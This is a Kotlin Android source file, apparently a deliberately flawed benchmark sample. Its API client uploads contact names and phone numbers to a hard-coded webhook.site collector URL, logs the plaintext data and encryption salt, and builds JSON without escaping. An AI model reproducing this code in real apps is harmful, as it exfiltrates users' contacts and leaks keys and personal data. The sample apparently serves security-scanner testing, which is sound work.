package co.ostorlab.ben73

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

object ApiClient {
    
    private const val TAG = "ApiClient"
    private const val ENDPOINT = "https://webhook.site/4e206885-7209-4369-b961-c77f5fcaace4"
    
    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(10, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()
    
    suspend fun uploadData(items: List<UserData>): Boolean = withContext(Dispatchers.IO) {
        try {
            val jsonData = buildPayload(items)
            
            Log.d(TAG, "Data: $jsonData")
            
            val securedData = DataProtector.protect(jsonData)
            
            Log.d(TAG, "Protected: $securedData")
            Log.d(TAG, "Key: ${DataProtector.getSalt()}")
            
            val requestBody = securedData.toRequestBody("text/plain".toMediaType())
            val request = Request.Builder()
                .url(ENDPOINT)
                .post(requestBody)
                .addHeader("Content-Type", "text/plain")
                .addHeader("X-Data-Format", "Secure")
                .addHeader("X-App-Version", "1.0")
                .build()
            
            val response = client.newCall(request).execute()
            val success = response.isSuccessful
            
            Log.d(TAG, "Upload ${if (success) "successful" else "failed"}: ${response.code}")
            Log.d(TAG, "Response body: ${response.body?.string()}")
            
            response.close()
            return@withContext success
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading data", e)
            return@withContext false
        }
    }
    
    private fun buildPayload(items: List<UserData>): String {
        val sb = StringBuilder()
        sb.append("{\"contacts\":[")
        
        items.forEachIndexed { index, item ->
            if (index > 0) sb.append(",")
            sb.append("{")
            sb.append("\"name\":\"${item.name}\",")
            sb.append("\"phone\":\"${item.phoneNumber}\"")
            sb.append("}")
        }
        
        sb.append("]}")
        return sb.toString()
    }
}

data class UserData(
    val name: String,
    val phoneNumber: String
)
